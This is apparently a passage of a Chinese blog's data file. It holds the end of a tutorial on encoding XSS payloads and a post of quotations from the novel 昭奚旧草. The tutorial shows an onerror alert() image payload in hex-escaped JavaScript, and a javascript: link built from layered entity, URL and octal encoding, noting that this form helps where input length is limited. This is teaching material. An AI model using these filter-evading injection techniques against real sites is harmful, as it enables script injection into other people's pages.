class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"comment\">//进行 JS Unicode 转码前的样子：</span></div><div class=\"line\">    <span class=\"comment\">//document.body.innerHTML=\"&lt;img src='' onerror='alert(/xss/)'/&gt;\";</span></div><div class=\"line\">    <span class=\"built_in\">document</span>.body.innerHTML=<span class=\"string\">\"\\x3c\\x69\\x6d\\x67\\x20\\x73\\x72\\x63\\x3d\\x27\\x27\\x20\\x6f\\x6e\\x65\\x72\\x72\\x6f\\x72\\x3d\\x27\\x61\\x6c\\x65\\x72\\x74\\x28\\x2f\\x78\\x73\\x73\\x2f\\x29\\x27\\x2f\\x3e\"</span>;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>如果你仔细观察下，会发现， JS 8进制编码的长度要短一些，如果遇到插入长度有所限制的情况就可以用到这个特点。<br>还有一种叫做 <a href=\"http://www.jsfuck.com/\" target=\"_blank\" rel=\"external\">JSFuck</a> 的编码，长什么样呢？<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"linediv></pre></td></tr></table></figure></p>\n<p>我们在 Chrome 的控制台中输入：<br><img src=\"/Image/jsfuck_chrome.png\" alt=\"jsfunck_chrome\"></p>\n<p>如果想详细了解浏览器、解释器之间到底是怎么配合的，可以看看这篇文章学习一下。<br><a href=\"http://taligarsiel.com/Projects/howbrowserswork1.htm\" target=\"_blank\" rel=\"external\">How browsers work - Behind the scenes of modern web browsers</a></p>\n<p>现在再来看看开头提到的混合编码：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:ShowSomething('&amp;#37&amp;#53&amp;#99&amp;#37&amp;#55&amp;#56&amp;#37&amp;#51&amp;#52&amp;#37&amp;#51&amp;#49');\"</span>&gt;</span>click<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ShowSomething</span>(<span class=\"params\">x</span>)</span>&#123;</div><div class=\"line\">        alert(x);</div><div class=\"line\">    &#125;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>页面加载时，会把 a 标签中的 HTML 实体编码做解码。<br>当点击「click」时，先把 href 的内容当作整体做 URL 解码。<br>最后因为 javascript 伪协议，把其中的 8进制转义字符做解码。<br>至于每一步，由什么转成什么，就不用我说了吧：）</p>\n<h3 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h3><p>本篇的目的在于科普基础的编码，为了让非科班出身的朋友看起来不那么晦涩，理论知识介绍较少。<br>但这不代表理论知识不重要，我的初衷是希望大家能把我的例子拿出来修修改改，尝试不同的可能。在摸索中遇到疑惑，然后自己解决困惑，渐渐积累起一定的概念后，会有想知道原理的冲动。相信这个时候，你积累的东西已经能让你阅读通顺了。<br>写这篇文章的过程中，自己也查阅了很多的文章与维基百科，写了大量的测试代码来验证想法和探究原理，与老司机交流解惑。但最后只把其中比较直观的拿出来当作例子。后面再写写一些我了解到的姿势和一些需要搞清楚的原理性知识点也说不定（上面的那篇 How browsers work 中有此类知识点）。<br>不过到时候你可能已经比我强了，记得带带我：）</p>"},{"title":"昭奚旧草  2016-12-26","date":"2016-12-25T22:31:20.000Z","layout":"post","comments":1,"reward":true,"_content":"> **“他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。”**\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=35566987&auto=0&height=66\"></iframe>\n\n一夜未眠，伴着音乐工作，忽然放到这首音乐，把我从一块块代码中拉到了另一个世界。\n\n可能是现实生活的稀松平常会让一个人无法抵抗逃离现实的诱惑，将自己置身于那个俯身便可阅尽众生轮回的世界，停泊在泼墨笔尖。\n\n<!--more-->\n\n> \"有怪踩月而来，美如秋水，清如山河，生呆若木鸡，爱而不能忍，甚倾之。\" 爱到何处，已不能忍受咫尺之距。甚倾之。生甚倾之。\n\n﻿\n> 从不知相思，安知相思死。﻿﻿\n\n﻿\n> “我与梦中的小小姑娘说，等她长大了，便带她去看悬崖上的红花、海底的白珠，欢喜她欢喜到打仗吃酒读书抚琴都忍不住带到身边，山高水长过一辈子。”\n“然后呢？”\n“然后，她死在了长大嫁人的那一日。”\n\n﻿\n> 他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。﻿﻿\n\n﻿\n> 但凡人命，皆由天意妄肆而定，我不入红尘，此生不驯。﻿﻿\n\n﻿\n> 我也曾备下三十三城嫁妆，预备嫁我价值连城的掌珠。﻿﻿\n\n﻿\n> “奚山，什么是命？”\n“就是任你万念俱灰死而复生，日夜不停绝望哭泣，也依旧拿它没有办法的东西啊。得不到的就是得不到，那样东西卑鄙地诱惑着你，背对着你却几乎笑得喘不过气，它对所有有资格得到它的人共享欢愉，共分秘密，一同看戏，看着你，而后转头告诉那些人，瞧，那个小傻子，也妄想得到我呢。”\n\n﻿\n> 她欢喜他，叶公好龙，他爱着她，尾生抱柱。﻿﻿\n\n﻿\n> 我只是想再瞧你一瞧，我怕再也瞧你不到。﻿﻿\n\n﻿\n> 更始十九年一个夏日的清晨，我卜了一卦，卦象安宁，说你还在。这一卦是我人生中唯一一次错了。卦象如此平静，除了可能是你一直活着，还有一种可能——你已不在很久。﻿﻿\n\n﻿\n> 君当如何，妾当如何。君是乱臣，妾做贼子。﻿﻿\n\n﻿\n> 三娘低声道：“我与山君不同。我喜欢的人若是也喜欢我，便只能喜欢我一人。哪怕他喜欢旁的女子只是一时一日，我也断然不会让他好受。他喜欢我不能是最喜欢，更不能只是浅浅的喜欢，最喜欢时还有次喜欢，浅浅喜欢我那深深喜欢又给了谁？他只能喜欢我。”\n\n﻿\n> 我长不大了，却在变老。时间是永恒的，我却在消耗。没有人知道我在等什么，我也不必让他们知道。他们看到我是笑着的，可是我难过的时候除了不停呼吸，已经蠢到不知道该干什么。你若了解苍穹之宽阔，便明白我抬头仰望时的悲渺。仿佛我生下来就是这样孤零零的，仿佛到现在，我还是这一个我。﻿﻿\n\n﻿\n> 没有瞧见她的时候，天下倒还是个天下的模样，她死了，天下变成了一桩桩琐事。﻿\n\n﻿\n> 从此我活着仅仅是为了熬完最后的日子，不管二十岁还是六十岁。﻿﻿\n\n﻿\n> 君心何坚决，到死无两意。﻿﻿\n\n﻿\n> 他一直等着，待到下辈子，他与她不亏不欠了，便莫要欢喜过甚，钟情过疾，骄傲过命，只是结个良缘，也能好聚好散。﻿﻿\n\n﻿\n> 打散的，寂寞之徒；忘却的，年岁偶驻。﻿﻿\n\n﻿\n> 我的爱比别人廉价，满了便溢，没什么可惜。因我知终有一日，它还会满。﻿﻿\n\n﻿\n> 那是她失去了许久的东西，这世上再无人知道了，可只有她，一直这样艰难地铭记着。哪怕失去了味觉，失去了感情， 变成了一粒草籽，一片乌云，也钻心刺骨地无法忘记。 她这样深切痛苦地思念着他，是思念教她走到今日。﻿﻿\n\n﻿\n> 我得宠溺他一生一世，做个他，像他待我那一辈子。惟愿他，此生便是那个前世懵懂的我，被钟爱，被安排。虽则天常有不测风云。 我也曾想，我若为天，该有多好，定善待他终生。﻿\n\n﻿\n> 我若为天，他的磨难中总存一线希望，痛苦中还有转圜。这世上神话故事颇多，每一桩，都是我来演。我来做山，做海，做泥荷，做蝼蚁，苍天有束光可偷，我也偷来，予他做个冠带。你何必惊讶他竟不能处处识得我，也不必知道，这样的强制安排不是为了满足我的爱，而是为了想要他还能笑出来。﻿\n\n﻿\n> “须知万物皆有少年早衰之时，焉知我便强过谁？”\n“你是我的妻子，自然强过这世间千千万。”\n\n﻿\n>  她知道他必定曾经在很遥远很遥远的时候，抱她入怀，那样珍重，那样怜爱。那或许是他们的前世，只有她记得的前世 。人说讲虚妄之事是因无知，只有忍冬知道，她划定了一个虚无的前世，只是因为太想得到。﻿\n\n﻿\n> 她说：“我就此消失，祈求奚山君夺去我在你脑海中的记忆，这样，你此生，便可如高岭之雪，不受玷污，成为第一等诸侯，得到第一等封邑，娶得第一等娇妻，福寿双全。”\n风起云涌，屏风渐渐随着风化，屏风内的那张干净的面庞也随着屏风一寸寸变成沙尘。﻿\n她说：“谢良辰，我知道你觉得我配不上你，不该奢望。可是，你何曾配得上过我那样的喜欢？故而，打从今天，从这一刻钟，从我们初初见面的那一眼，从夏虫鸣了，桃花散了，竹叶青了的时候算起，我们两不相欠。”\n\n﻿\n> 本是深闺梦中人，日头月头霞光雾霰万象变幻，自哂自嘲自污自怨不自量力，不过是，怕人听见。﻿\n你怨我欢喜得卑鄙，欢喜得浅薄，可是你前生，又爱我到如何，才教我今生从头清算，迎头一棒，鲜血淋漓，这样去还。﻿\n\n﻿\n> 她死的那一日，天上飞来许多雀鸟，那鸟儿眼瞧着就要自由。他让人打落了所有的鸟儿，葬在她的坟前，祭奠她此生可贵的自由，他此生卑微的囚途。﻿\n\n﻿\n> 百国男子老老少少，我瞧见谁，一错眼一恍惚，便总是隐约觉得他们五官血脉中或多或少都有一丝一毫像着你，他们并不是你，我寻不到你，可他们像你。﻿\n\n﻿\n> 爱太执着，恨太浓烈，她旧时候都尝过，可待到来年，它们就长成了遗憾。旧时景色，旧时人情，旧时琳琅，旧时凋零。满目疮痍，不忍目睹。﻿\n\n﻿\n> 人世本就是一场游戏，你若已然输了，便不要再让对手赢了。成全没有任何意义，成全让恨意滋生，爱自己是活着的唯一意义，灰烬之后，才是田园斜径，白云出岫。﻿\n\n﻿\n>  我想死到山涧，天地之间无人寻到，连鸟兽都不去的地方。这样尸体就能慢慢腐烂消散，不用与这来去都匆匆的人生一般。听闻骨头化得慢一些，可以慢慢等，等到灵魂都变成这空气的一部分，便能融入这世间，同这世间一般污浊了。到时候，再也没有人，为了求取我拥有的最后一样东西，而哄骗我，同我说这世间存有许多真情的假话了。﻿\n\n﻿\n> 卧夜坐起风雨，推窗广厦明烛。天也有十分心愿，宁可千万人顺心如意。到头来，磨难重重；换一人，白首不离。﻿\n\n﻿\n>  我有没有告诉过你，你是我看过最好看的男子？就算有人比你好看，可那也与我没什么相干。我说我讨厌你的时候，其实在想，这样待你是讨厌你，等我控制不住，待你再好一些的时候，你便不会再惧怕我，只会觉得我只是从讨厌你变成喜欢你罢了。﻿\n而非，从深深喜欢你到深深爱慕你。﻿\n\n﻿\n> 大昭明珠生得极美，他带着千方百计，阴谋阳策，堪堪呼喝随身内侍扶正发间的那顶珠冠，也只是一垂头，含笑落泪。再抬起头，已是一目千里。可是他还是来不及，好好地，好好看她一眼。﻿\n\n﻿\n> 火焰从翠衣人的脚边慢慢蹿起，天上却浮现了明亮的霞光。男子眼中无情无欲，只剩下悲悯。他临风而立，狂风吹起翠色的长袖。他说：“既已如此，三娘，莫再回头。你我夫妻缘尽，你莫回头瞧我，我亦不再瞧你。我入仙道，你入轮回，你我，再无相见，再无回头之日。”\n\n﻿\n> “世间有人爱我，有人憎我，有人说我对，有人说我错，如此，我当听哪一句？”\n“有某说你对，是因你所说之事合他心意。有某说你错，是因你所做之事与他所想相悖。说你对的许是你说了他不敢说的，承担了他不敢承担的，故而爱你，故而对你击节称赞，说穿了实在酸涩。说你错的许是你真的错了，因你之错太过明显，已暴露在诸人之中，而诸人皆是知道真相之人，他们不语，暗自看你笑话，那直接说你错的许是憎你，但你应谢他直言这一回。”﻿\n\n﻿\n> 她用一双眼望着苍天，与它对视。﻿\n\n﻿\n> 她说:“我幼小的时候，曾求你仁慈，后来长大了，便不再求你，因为我通晓了人事，知道求你也无用。求你只会让你嘲弄我、轻鄙我，求你只会让你知道我的弱点，知道我在乎什么。我的孩儿们小时候，我都曾拉着他们的小手，站在空旷的天地上，向你叩拜，我求你保佑他们好好长大，不要像我一样，我求你赐给他们快乐而勇敢的心，无论命运怎么捉弄都不会丧失希望。我所要的不多，并……不多啊。\n是啊，我输了，你赢了。我敌不过命运，我以人智，妄想换天。可是，那又如何？那又能怎样！”\n\n\n﻿\n> 先时我不信人间何物是长久的，亦总觉人与畜生无有不同，因人一生如此短暂，悟到什么，也只剩来不及。﻿\n\n﻿\n> “他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。”\n\n﻿\n> 你觉得活着费力，任凭谁也没好过多少。何苦生为人，人就是这样苦，你倘有本事，下辈子便托生为一块石头，那才妙。﻿\n\n﻿\n> 我可能不曾告诉过你，我有一个哥哥，我那个哥哥死了。对，每个人都会死，他与别的人都一样，他也死了，他说他二十岁的时候，会送我嫁给这世上最好看的男子，可我等了三百年，却再也盼不到他二十岁了。但我想，我一定得达成他的愿望，我得嫁给这世上最好看的男子，我要我的夫君万世其昌，我要你好好的，好好的子孙满堂。﻿\n\n﻿\n> 天下甚美。我还肯爱这山河，只是因为他还热切地爱着河山。\n\n文中句子取自：[《昭奚旧草》 摘抄：愿以百年挽朝夕](http://www.jianshu.com/p/e2b0f761df24)\n","source":"_posts/zhaoxijiucao.md","raw":"---\ntitle: 昭奚旧草  2016-12-26\ndate: 2016-12-26 06:31:20\nlayout: post\ncomments: true\nreward: true\ntags:\n    - Leo\n    - 音乐\n---\n> **“他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。”**\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=35566987&auto=0&height=66\"></iframe>\n\n一夜未眠，伴着音乐工作，忽然放到这首音乐，把我从一块块代码中拉到了另一个世界。\n\n可能是现实生活的稀松平常会让一个人无法抵抗逃离现实的诱惑，将自己置身于那个俯身便可阅尽众生轮回的世界，停泊在泼墨笔尖。\n\n<!--more-->\n\n> \"有怪踩月而来，美如秋水，清如山河，生呆若木鸡，爱而不能忍，甚倾之。\" 爱到何处，已不能忍受咫尺之距。甚倾之。生甚倾之。\n\n﻿\n> 从不知相思，安知相思死。﻿﻿\n\n﻿\n> “我与梦中的小小姑娘说，等她长大了，便带她去看悬崖上的红花、海底的白珠，欢喜她欢喜到打仗吃酒读书抚琴都忍不住带到身边，山高水长过一辈子。”\n“然后呢？”\n“然后，她死在了长大嫁人的那一日。”\n\n﻿\n> 他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。﻿﻿\n\n﻿\n> 但凡人命，皆由天意妄肆而定，我不入红尘，此生不驯。﻿﻿\n\n﻿\n> 我也曾备下三十三城嫁妆，预备嫁我价值连城的掌珠。﻿﻿\n\n﻿\n> “奚山，什么是命？”\n“就是任你万念俱灰死而复生，日夜不停绝望哭泣，也依旧拿它没有办法的东西啊。得不到的就是得不到，那样东西卑鄙地诱惑着你，背对着你却几乎笑得喘不过气，它对所有有资格得到它的人共享欢愉，共分秘密，一同看戏，看着你，而后转头告诉那些人，瞧，那个小傻子，也妄想得到我呢。”\n\n﻿\n> 她欢喜他，叶公好龙，他爱着她，尾生抱柱。﻿﻿\n\n﻿\n> 我只是想再瞧你一瞧，我怕再也瞧你不到。﻿﻿\n\n﻿\n> 更始十九年一个夏日的清晨，我卜了一卦，卦象安宁，说你还在。这一卦是我人生中唯一一次错了。卦象如此平静，除了可能是你一直活着，还有一种可能——你已不在很久。﻿﻿\n\n﻿\n> 君当如何，妾当如何。君是乱臣，妾做贼子。﻿﻿\n\n﻿\n> 三娘低声道：“我与山君不同。我喜欢的人若是也喜欢我，便只能喜欢我一人。哪怕他喜欢旁的女子只是一时一日，我也断然不会让他好受。他喜欢我不能是最喜欢，更不能只是浅浅的喜欢，最喜欢时还有次喜欢，浅浅喜欢我那深深喜欢又给了谁？他只能喜欢我。”\n\n﻿\n> 我长不大了，却在变老。时间是永恒的，我却在消耗。没有人知道我在等什么，我也不必让他们知道。他们看到我是笑着的，可是我难过的时候除了不停呼吸，已经蠢到不知道该干什么。你若了解苍穹之宽阔，便明白我抬头仰望时的悲渺。仿佛我生下来就是这样孤零零的，仿佛到现在，我还是这一个我。﻿﻿\n\n﻿\n> 没有瞧见她的时候，天下倒还是个天下的模样，她死了，天下变成了一桩桩琐事。﻿\n\n﻿\n> 从此我活着仅仅是为了熬完最后的日子，不管二十岁还是六十岁。﻿﻿\n\n﻿\n> 君心何坚决，到死无两意。﻿﻿\n\n﻿\n> 他一直等着，待到下辈子，他与她不亏不欠了，便莫要欢喜过甚，钟情过疾，骄傲过命，只是结个良缘，也能好聚好散。﻿﻿\n\n﻿\n> 打散的，寂寞之徒；忘却的，年岁偶驻。﻿﻿\n\n﻿\n> 我的爱比别人廉价，满了便溢，没什么可惜。因我知终有一日，它还会满。﻿﻿\n\n﻿\n> 那是她失去了许久的东西，这世上再无人知道了，可只有她，一直这样艰难地铭记着。哪怕失去了味觉，失去了感情， 变成了一粒草籽，一片乌云，也钻心刺骨地无法忘记。 她这样深切痛苦地思念着他，是思念教她走到今日。﻿﻿\n\n﻿\n> 我得宠溺他一生一世，做个他，像他待我那一辈子。惟愿他，此生便是那个前世懵懂的我，被钟爱，被安排。虽则天常有不测风云。 我也曾想，我若为天，该有多好，定善待他终生。﻿\n\n﻿\n> 我若为天，他的磨难中总存一线希望，痛苦中还有转圜。这世上神话故事颇多，每一桩，都是我来演。我来做山，做海，做泥荷，做蝼蚁，苍天有束光可偷，我也偷来，予他做个冠带。你何必惊讶他竟不能处处识得我，也不必知道，这样的强制安排不是为了满足我的爱，而是为了想要他还能笑出来。﻿\n\n﻿\n> “须知万物皆有少年早衰之时，焉知我便强过谁？”\n“你是我的妻子，自然强过这世间千千万。”\n\n﻿\n>  她知道他必定曾经在很遥远很遥远的时候，抱她入怀，那样珍重，那样怜爱。那或许是他们的前世，只有她记得的前世 。人说讲虚妄之事是因无知，只有忍冬知道，她划定了一个虚无的前世，只是因为太想得到。﻿\n\n﻿\n> 她说：“我就此消失，祈求奚山君夺去我在你脑海中的记忆，这样，你此生，便可如高岭之雪，不受玷污，成为第一等诸侯，得到第一等封邑，娶得第一等娇妻，福寿双全。”\n风起云涌，屏风渐渐随着风化，屏风内的那张干净的面庞也随着屏风一寸寸变成沙尘。﻿\n她说：“谢良辰，我知道你觉得我配不上你，不该奢望。可是，你何曾配得上过我那样的喜欢？故而，打从今天，从这一刻钟，从我们初初见面的那一眼，从夏虫鸣了，桃花散了，竹叶青了的时候算起，我们两不相欠。”\n\n﻿\n> 本是深闺梦中人，日头月头霞光雾霰万象变幻，自哂自嘲自污自怨不自量力，不过是，怕人听见。﻿\n你怨我欢喜得卑鄙，欢喜得浅薄，可是你前生，又爱我到如何，才教我今生从头清算，迎头一棒，鲜血淋漓，这样去还。﻿\n\n﻿\n> 她死的那一日，天上飞来许多雀鸟，那鸟儿眼瞧着就要自由。他让人打落了所有的鸟儿，葬在她的坟前，祭奠她此生可贵的自由，他此生卑微的囚途。﻿\n\n﻿\n> 百国男子老老少少，我瞧见谁，一错眼一恍惚，便总是隐约觉得他们五官血脉中或多或少都有一丝一毫像着你，他们并不是你，我寻不到你，可他们像你。﻿\n\n﻿\n> 爱太执着，恨太浓烈，她旧时候都尝过，可待到来年，它们就长成了遗憾。旧时景色，旧时人情，旧时琳琅，旧时凋零。满目疮痍，不忍目睹。﻿\n\n﻿\n> 人世本就是一场游戏，你若已然输了，便不要再让对手赢了。成全没有任何意义，成全让恨意滋生，爱自己是活着的唯一意义，灰烬之后，才是田园斜径，白云出岫。﻿\n\n﻿\n>  我想死到山涧，天地之间无人寻到，连鸟兽都不去的地方。这样尸体就能慢慢腐烂消散，不用与这来去都匆匆的人生一般。听闻骨头化得慢一些，可以慢慢等，等到灵魂都变成这空气的一部分，便能融入这世间，同这世间一般污浊了。到时候，再也没有人，为了求取我拥有的最后一样东西，而哄骗我，同我说这世间存有许多真情的假话了。﻿\n\n﻿\n> 卧夜坐起风雨，推窗广厦明烛。天也有十分心愿，宁可千万人顺心如意。到头来，磨难重重；换一人，白首不离。﻿\n\n﻿\n>  我有没有告诉过你，你是我看过最好看的男子？就算有人比你好看，可那也与我没什么相干。我说我讨厌你的时候，其实在想，这样待你是讨厌你，等我控制不住，待你再好一些的时候，你便不会再惧怕我，只会觉得我只是从讨厌你变成喜欢你罢了。﻿\n而非，从深深喜欢你到深深爱慕你。﻿\n\n﻿\n> 大昭明珠生得极美，他带着千方百计，阴谋阳策，堪堪呼喝随身内侍扶正发间的那顶珠冠，也只是一垂头，含笑落泪。再抬起头，已是一目千里。可是他还是来不及，好好地，好好看她一眼。﻿\n\n﻿\n> 火焰从翠衣人的脚边慢慢蹿起，天上却浮现了明亮的霞光。男子眼中无情无欲，只剩下悲悯。他临风而立，狂风吹起翠色的长袖。他说：“既已如此，三娘，莫再回头。你我夫妻缘尽，你莫回头瞧我，我亦不再瞧你。我入仙道，你入轮回，你我，再无相见，再无回头之日。”\n\n﻿\n> “世间有人爱我，有人憎我，有人说我对，有人说我错，如此，我当听哪一句？”\n“有某说你对，是因你所说之事合他心意。有某说你错，是因你所做之事与他所想相悖。说你对的许是你说了他不敢说的，承担了他不敢承担的，故而爱你，故而对你击节称赞，说穿了实在酸涩。说你错的许是你真的错了，因你之错太过明显，已暴露在诸人之中，而诸人皆是知道真相之人，他们不语，暗自看你笑话，那直接说你错的许是憎你，但你应谢他直言这一回。”﻿\n\n﻿\n> 她用一双眼望着苍天，与它对视。﻿\n\n﻿\n> 她说:“我幼小的时候，曾求你仁慈，后来长大了，便不再求你，因为我通晓了人事，知道求你也无用。求你只会让你嘲弄我、轻鄙我，求你只会让你知道我的弱点，知道我在乎什么。我的孩儿们小时候，我都曾拉着他们的小手，站在空旷的天地上，向你叩拜，我求你保佑他们好好长大，不要像我一样，我求你赐给他们快乐而勇敢的心，无论命运怎么捉弄都不会丧失希望。我所要的不多，并……不多啊。\n是啊，我输了，你赢了。我敌不过命运，我以人智，妄想换天。可是，那又如何？那又能怎样！”\n\n\n﻿\n> 先时我不信人间何物是长久的，亦总觉人与畜生无有不同，因人一生如此短暂，悟到什么，也只剩来不及。﻿\n\n﻿\n> “他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。”\n\n﻿\n> 你觉得活着费力，任凭谁也没好过多少。何苦生为人，人就是这样苦，你倘有本事，下辈子便托生为一块石头，那才妙。﻿\n\n﻿\n> 我可能不曾告诉过你，我有一个哥哥，我那个哥哥死了。对，每个人都会死，他与别的人都一样，他也死了，他说他二十岁的时候，会送我嫁给这世上最好看的男子，可我等了三百年，却再也盼不到他二十岁了。但我想，我一定得达成他的愿望，我得嫁给这世上最好看的男子，我要我的夫君万世其昌，我要你好好的，好好的子孙满堂。﻿\n\n﻿\n> 天下甚美。我还肯爱这山河，只是因为他还热切地爱着河山。\n\n文中句子取自：[《昭奚旧草》 摘抄：愿以百年挽朝夕](http://www.jianshu.com/p/e2b0f761df24)\n","slug":"zhaoxijiucao","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k8j000umkwbsqiecvyd","content":"<blockquote>\n<p><strong>“他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。”</strong></p>\n</blockquote>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=35566987&auto=0&height=66\"></iframe>\n\n<p>一夜未眠，伴着音乐工作，忽然放到这首音乐，把我从一块块代码中拉到了另一个世界。</p>\n<p>可能是现实生活的稀松平常会让一个人无法抵抗逃离现实的诱惑，将自己置身于那个俯身便可阅尽众生轮回的世界，停泊在泼墨笔尖。</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>“有怪踩月而来，美如秋水，清如山河，生呆若木鸡，爱而不能忍，甚倾之。” 爱到何处，已不能忍受咫尺之距。甚倾之。生甚倾之。</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>从不知相思，安知相思死。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“我与梦中的小小姑娘说，等她长大了，便带她去看悬崖上的红花、海底的白珠，欢喜她欢喜到打仗吃酒读书抚琴都忍不住带到身边，山高水长过一辈子。”<br>“然后呢？”<br>“然后，她死在了长大嫁人的那一日。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>但凡人命，皆由天意妄肆而定，我不入红尘，此生不驯。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我也曾备下三十三城嫁妆，预备嫁我价值连城的掌珠。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“奚山，什么是命？”<br>“就是任你万念俱灰死而复生，日夜不停绝望哭泣，也依旧拿它没有办法的东西啊。得不到的就是得不到，那样东西卑鄙地诱惑着你，背对着你却几乎笑得喘不过气，它对所有有资格得到它的人共享欢愉，共分秘密，一同看戏，看着你，而后转头告诉那些人，瞧，那个小傻子，也妄想得到我呢。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她欢喜他，叶公好龙，他爱着她，尾生抱柱。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我只是想再瞧你一瞧，我怕再也瞧你不到。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>更始十九年一个夏日的清晨，我卜了一卦，卦象安宁，说你还在。这一卦是我人生中唯一一次错了。卦象如此平静，除了可能是你一直活着，还有一种可能——你已不在很久。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>君当如何，妾当如何。君是乱臣，妾做贼子。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>三娘低声道：“我与山君不同。我喜欢的人若是也喜欢我，便只能喜欢我一人。哪怕他喜欢旁的女子只是一时一日，我也断然不会让他好受。他喜欢我不能是最喜欢，更不能只是浅浅的喜欢，最喜欢时还有次喜欢，浅浅喜欢我那深深喜欢又给了谁？他只能喜欢我。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我长不大了，却在变老。时间是永恒的，我却在消耗。没有人知道我在等什么，我也不必让他们知道。他们看到我是笑着的，可是我难过的时候除了不停呼吸，已经蠢到不知道该干什么。你若了解苍穹之宽阔，便明白我抬头仰望时的悲渺。仿佛我生下来就是这样孤零零的，仿佛到现在，我还是这一个我。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>没有瞧见她的时候，天下倒还是个天下的模样，她死了，天下变成了一桩桩琐事。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>从此我活着仅仅是为了熬完最后的日子，不管二十岁还是六十岁。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>君心何坚决，到死无两意。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>他一直等着，待到下辈子，他与她不亏不欠了，便莫要欢喜过甚，钟情过疾，骄傲过命，只是结个良缘，也能好聚好散。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>打散的，寂寞之徒；忘却的，年岁偶驻。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我的爱比别人廉价，满了便溢，没什么可惜。因我知终有一日，它还会满。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>那是她失去了许久的东西，这世上再无人知道了，可只有她，一直这样艰难地铭记着。哪怕失去了味觉，失去了感情， 变成了一粒草籽，一片乌云，也钻心刺骨地无法忘记。 她这样深切痛苦地思念着他，是思念教她走到今日。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我得宠溺他一生一世，做个他，像他待我那一辈子。惟愿他，此生便是那个前世懵懂的我，被钟爱，被安排。虽则天常有不测风云。 